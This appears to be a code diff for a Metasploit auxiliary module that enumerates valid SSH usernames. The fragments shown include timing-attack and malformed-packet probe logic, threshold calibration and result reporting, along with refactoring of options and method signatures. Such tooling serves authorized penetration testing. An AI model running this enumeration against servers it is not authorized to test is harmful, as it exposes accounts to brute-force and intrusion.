@@ -106,25 +106,10 @@ class MetasploitModule < Msf::Auxiliary
                    ]),
         OptInt.new('RETRY_NUM',
                    [
-                     true, 'The number of attempts to connect to a SSH server' \
-                   ' for each user', 3
-                   ]),
-        OptInt.new('SSH_TIMEOUT',
-                   [
-                     false, 'Specify the maximum time to negotiate a SSH session',
-                     10
-                   ]),
-        OptBool.new('SSH_DEBUG',
-                    [
-                      false, 'Enable SSH debugging output (Extreme verbosity!)',
-                      false
-                    ])
+                     true, 'The number of retries on connection error per user', 3
+                   ])
       ]
     )
-  end
-
-  def rport
-    datastore['RPORT']
   end
 
   def retry_num
@@ -154,7 +139,6 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{Rex::Socket.to_authority(rhost, rport)} - Calibrated threshold: #{@calibrated_threshold}s (mean: #{mean.round(2)}s, jitter: #{stddev.round(2)}s)")
   end
 
-  # Returns true if a nonsense username appears active.
   def check_false_positive(ip)
     user = Rex::Text.rand_text_alphanumeric(8..32)
     attempt_user(user, ip, label: '<random>') == :success
@@ -184,12 +168,12 @@ class MetasploitModule < Msf::Auxiliary
     start_time = Time.new
 
     begin
-      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
+      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
         Net::SSH.start(ip, user, opts)
       end
     rescue Rex::ConnectionError
       return :connection_error
-    rescue Timeout::Error
+    rescue ::Timeout::Error
       return :success if technique == :timing_attack
     rescue Net::SSH::AuthenticationFailed
       return :fail if technique == :malformed_packet
@@ -215,10 +199,10 @@ class MetasploitModule < Msf::Auxiliary
     Rex::Text.rand_text_english(64_000..65_000)
   end
 
-  def do_report(ip, user, _port)
+  def do_report(ip, port, user)
     service_data = {
       address: ip,
-      port: rport,
+      port: port,
       service_name: 'ssh',
       protocol: 'tcp',
       workspace_id: myworkspace_id
@@ -284,7 +268,7 @@ class MetasploitModule < Msf::Auxiliary
     case attempt_result
     when :success
       print_good("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' found")
-      do_report(ip, user, rport)
+      do_report(ip, rport, user)
     when :connection_error
       vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' could not connect")
     when :fail
@@ -343,6 +327,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     users = user_list
+    return if users.empty?
+
     print_status("#{Rex::Socket.to_authority(rhost, rport)} - Starting SSH username enumeration")
     found_users = users.select do |user|
       result = attempt_user(user, ip)
